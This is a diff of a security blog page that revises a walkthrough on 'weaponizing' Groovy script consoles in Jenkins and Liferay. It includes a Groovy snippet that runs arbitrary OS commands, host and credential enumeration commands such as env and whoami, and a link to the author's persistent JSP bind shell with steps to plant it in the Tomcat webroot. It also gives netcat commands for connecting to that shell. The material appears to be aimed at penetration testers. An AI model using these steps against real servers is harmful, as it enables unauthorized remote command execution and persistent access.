@@ -6,7 +6,7 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>Weaponizing the Groovy script console: bind shells &amp; tool transfers | vipa0z</title>
+  <title>Weaponizing the Groovy script console: Initial Access &amp; base64 tool transfers | vipa0z</title>
   <meta name="author" content="vipa0z">
   
   <meta name="description" content=" A practical walkthrough of abusing Groovy script consoles in Jenkins and Liferay to write persistent JSP bind shells, with techniques for transferring tools (base64), persistence, and post-exploitation — tailored for tight scenarios where outgoing network access is blocked by firewalls.">
@@ -16,7 +16,7 @@
 
   <meta name="google-site-verification" content="-1CTZCLTxditzGFr67zWpI5-6H8z7TlZt_LuEkJaIKE" />
 
-  <meta property="og:title" content="Weaponizing the Groovy script console: bind shells &amp; tool transfers"/>
+  <meta property="og:title" content="Weaponizing the Groovy script console: Initial Access &amp; base64 tool transfers"/>
   <meta property="og:site_name" content="vipa0z"/>
 
   
@@ -126,7 +126,7 @@
 
 	
 		<div class="page-header">
-			<h1> Weaponizing the Groovy script console: bind shells &amp; tool transfers</h1>
+			<h1> Weaponizing the Groovy script console: Initial Access &amp; base64 tool transfers</h1>
 		</div>
 	
 
@@ -165,16 +165,16 @@
 <li>Clean up and document detection artifacts.</li>
 </ol>
 <h3 id="Simple-OS-commands-POC"><a href="#Simple-OS-commands-POC" class="headerlink" title="Simple OS commands POC:"></a>Simple OS commands POC:</h3><p>POC script for running simple commands such as  <code>pwd, ls, dir, cd</code>  and trying to identify where the web root might be located:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux: pwd, ls -la, id, whoami, env</span><br><span class="line"></span><br><span class="line">Windows: dir, whoami, echo %USERPROFILE%</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> cmd=<span class="string">&quot;YOURCOMMAND-dir&quot;</span></span><br><span class="line"><span class="keyword">def</span> sout = <span class="keyword">new</span> StringBuilder(), serr = <span class="keyword">new</span> StringBuilder()</span><br><span class="line"><span class="keyword">def</span> proc = cmd.execute()</span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line">proc.waitForOrKill(<span class="number">1000</span>)</span><br><span class="line">println <span class="string">&quot;out&gt; $sout err&gt; $serr&quot;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="1-Finding-stable-writable-locations"><a href="#1-Finding-stable-writable-locations" class="headerlink" title="1) Finding stable, writable locations"></a>1) Finding stable, writable locations</h3><p>From the console, run simple listing commands to map the filesystem and locate likely writable paths:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Linux: pwd, ls -la, id, whoami, env</span><br><span class="line"></span><br><span class="line">Windows: dir, whoami, echo %USERPROFILE%</span><br></pre></td></tr></table></figure>
+<h3 id="1-Finding-stable-writable-locations"><a href="#1-Finding-stable-writable-locations" class="headerlink" title="1) Finding stable, writable locations"></a>1) Finding stable, writable locations</h3><p>From the console, run simple listing commands to map the filesystem and locate likely writable paths.</p>
 <p>Typical candidate locations:</p>
 <ul>
 <li>Application webroot (e.g., <code>&lt;TOMCAT_HOME&gt;/webapps/ROOT</code>) — files here can often be triggered by HTTP requests.</li>
-<li>Upload or config directories used by the application.</li>
 </ul>
-<p>This is where my bind shell comes into play: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java">https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java</a>. Use this link to access the code. I recommend reviewing it first, but you can also paste it into your Groovy console after updating the output path to match your Tomcat webroot.</p>
+<h3 id="2-bindshell-a-better-alternative-to-webshells"><a href="#2-bindshell-a-better-alternative-to-webshells" class="headerlink" title="2) bindshell &gt; a better alternative to webshells"></a>2) bindshell &gt; a better alternative to webshells</h3><p>This is where my bind shell comes into play: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java">https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java</a>. Use this link to access the code. I recommend reviewing it first, but you can also paste it into your Groovy console after updating the output path to match your Tomcat webroot.</p>
 <p>Hit save, then to enable the listener, browse to your webshell at: <a target="_blank" rel="noopener" href="http://site/threaded.jsp">http://site/threaded.jsp</a></p>
 <p>Connect to the bind shell via netcat:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">example 1:</span><br><span class="line">rlwrap -cAr nc -nv HOST-IP 3001</span><br><span class="line"></span><br><span class="line">example 2:</span><br><span class="line">rlwrap -cAr nc -nv 172.16.30.10 3001</span><br></pre></td></tr></table></figure>
